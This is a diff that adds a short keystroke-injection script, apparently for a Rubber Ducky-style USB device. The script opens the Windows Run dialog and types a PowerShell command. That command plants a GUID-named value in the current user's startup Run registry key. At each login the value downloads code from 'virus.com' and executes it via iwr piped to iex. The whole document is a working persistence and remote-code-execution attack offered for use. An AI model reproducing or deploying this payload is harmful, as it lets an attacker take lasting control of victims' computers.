@@ -1,0 +1,5 @@
+REM made by: unknown81311
+GUI R
+REM create registry sting var in the startup registry dir to website with a unique id for identifying.
+STRING powershell -Command "`$x=New-Guid;sp Registry::HKCU\Sof*\Mic*\Win*\Cu*\Run -name(`$x)\`"iwr virus.com?`$x|iex\`""
+ENTER
